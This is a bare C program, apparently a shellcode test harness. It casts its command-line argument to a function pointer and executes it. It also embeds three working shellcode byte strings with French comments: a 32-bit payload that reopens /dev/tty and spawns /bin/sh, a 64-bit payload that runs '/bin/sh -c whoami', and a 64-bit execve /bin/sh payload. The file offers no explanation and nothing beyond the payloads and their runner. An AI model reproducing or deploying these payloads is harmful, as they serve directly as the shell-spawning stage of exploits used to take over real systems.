#include <string.h>
#include <stdio.h>

int main(int argc, char *argv[])
{

	if (argc < 2) {
		printf("usage ./shell <shellcode>");
		return 1;
	}

	char *shellcode = argv[1];
	size_t shellcode_len = strlen(shellcode);
	printf("Shellcode Arguments size (bytes) : %ld\n", shellcode_len);
	printf("Shellcode Arguments : %s\n", shellcode);

	//////////////////////////////////////

	char shellcode32[] = "\x83\xc4\x18\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";//shellcode en x32 qui fonctionne avec -m32 /bin/sh


	char shellcode64[] = "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x07\x00\x00\x00\x77\x68\x6f\x61\x6d\x69\x00\x56\x57\x48\x89\xe6\x0f\x05" ;//Shellcode en x64 fonctionne

	char shellcode64_2[] = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"; //shellcode en x64 /bin/sh


fprintf(stdout,"Length en dur : %d\n",strlen(shellcode64_2));
 (*(void(*)())shellcode)();

return 0;
}
